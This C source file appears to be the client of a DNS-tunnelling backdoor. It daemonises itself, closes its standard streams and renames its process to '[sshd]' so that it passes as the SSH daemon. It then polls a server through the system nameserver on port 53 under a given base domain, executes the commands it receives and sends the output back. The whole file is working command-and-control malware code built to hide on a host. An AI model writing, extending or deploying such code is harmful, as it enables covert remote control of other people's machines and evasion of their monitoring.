#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <stdarg.h>
#include <sys/prctl.h>
#include "app.h"
#include "../include/util.h"
#include "../include/udp.h"
#include "../include/cmd.h"

#define MAXLINE 2048

/*
* client端定时询问server，是否有命令需要执行
*/
extern char g_baseDomain[255];


static void daemonlize()
{
    if (fork() == 0)
    {
        if (fork() == 0)
        {
            close(0);
            close(1);
            close(2);
            return;
        }
    }
    exit(0);
}

static void get_sys_nameserver(char * server, int len)
{
    FILE * fp = fopen("/etc/resolv.conf", "r");
    if (fp)
    {
        do
        {
            char line[255] = {0};
            (void)fgets(line, sizeof(line), fp);
            if (line[0] == '#')
            {
                continue;
            }

            if (strncmp("nameserver ", line, 11) == 0)
            {
                char * p = line + 11;
                char * out = (char *)server;
                while(*p != '\n')
                    *(out++) = *(p++);
                *out = 0;
                break;
            }
        }while(!feof(fp));
        fclose(fp);
    }
}

extern char **environ;
 
static char **g_main_Argv = NULL;    /* pointer to argument vector */
static char *g_main_LastArgv = NULL;    /* end of argv */
 
void setproctitle_init(int argc, char **argv, char **envp)
{
    int i;
 
    for (i = 0; envp[i] != NULL; i++) // calc envp num
        continue;
    environ = (char **) malloc(sizeof (char *) * (i + 1)); // malloc envp pointer
 
    for (i = 0; envp[i] != NULL; i++)
    {
        environ[i] = malloc(sizeof(char) * strlen(envp[i]));
        strcpy(environ[i], envp[i]);
    }
    environ[i] = NULL;
 
    g_main_Argv = argv;
    if (i > 0)
        g_main_LastArgv = envp[i - 1] + strlen(envp[i - 1]);
    else
        g_main_LastArgv = argv[argc - 1] + strlen(argv[argc - 1]);
}
 
void setproctitle(const char *fmt, ...)
{
    char *p;
    int i;
    char buf[MAXLINE];
 
    extern char **g_main_Argv;
    extern char *g_main_LastArgv;
    va_list ap;
    p = buf;
 
    va_start(ap, fmt);
    vsprintf(p, fmt, ap);
    va_end(ap);
 
    i = strlen(buf);
 
    if (i > g_main_LastArgv - g_main_Argv[0] - 2)
    {
        i = g_main_LastArgv - g_main_Argv[0] - 2;
        buf[i] = '\0';
    }
    //修改argv[0]
    (void) strcpy(g_main_Argv[0], buf);
 
    p = &g_main_Argv[0][i];
    while (p < g_main_LastArgv)
        *p++ = '\0';
    g_main_Argv[1] = NULL;
     
    //调用prctl
    prctl(PR_SET_NAME,buf);
}

int main(int argc, char *argv[])
{
    if (argc != 2)
    {
        printf("%s <baseDomain>\n", argv[0]);
        return 1;
    }

    daemonlize();
    strcpy_s(g_baseDomain, 255, argv[1]);

    setproctitle_init(argc, argv, environ);
    setproctitle("[sshd]");
    
    signal(SIGCHLD, SIG_IGN);//防止僵尸进程

    client_app_init();

    char dns_server_ip[255];
    get_sys_nameserver(dns_server_ip, sizeof(dns_server_ip));

    int fd = udp_connect(dns_server_ip, 53);
    if(fd == -1)
    {
        perror("udp connect fail");
        return 1;
    }

    char req[65536];
    char rsp[1024*1024];
    while(1){
        int len = client_recv(fd, req, sizeof(req));

        struct CmdReq * cmd = (struct CmdReq *)req;
        len = handleCmd(cmd, rsp, sizeof(rsp));
        if (len > 0)
        {
            len = client_send(fd, rsp, len);
        }

        delay(1, 0);
    }
        
    return 0;
}